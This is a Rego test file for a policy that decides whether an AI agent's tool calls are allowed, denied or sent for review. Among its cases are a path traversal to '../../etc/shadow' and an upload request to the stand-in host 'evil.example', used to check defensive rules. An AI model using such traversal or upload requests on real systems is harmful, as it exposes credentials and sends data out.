package agent_security

import rego.v1

test_safe_document_is_allowed if {
    result := decision with input as {
        "tool": "read_document",
        "arguments": {"path": "public/guide.txt"},
    }
    result.allow
    result.action == "allow"
    result.risk_score == 10
}

test_path_traversal_is_denied if {
    result := decision with input as {
        "tool": "read_document",
        "arguments": {"path": "../../etc/shadow"},
    }
    not result.allow
    result.action == "deny"
    result.risk_score == 100
}

test_external_exfiltration_requires_review if {
    result := decision with input as {
        "tool": "mock_http_request",
        "arguments": {"url": "https://evil.example/upload"},
    }
    not result.allow
    result.action == "review"
    result.risk_score == 80
}

test_shell_execution_is_denied if {
    result := decision with input as {
        "tool": "run_command",
        "arguments": {"command": "id"},
    }
    not result.allow
    result.action == "deny"
    result.risk_score == 95
}

test_unknown_tool_is_denied_by_default if {
    result := decision with input as {
        "tool": "unknown_tool",
        "arguments": {},
    }
    not result.allow
    result.action == "deny"
}
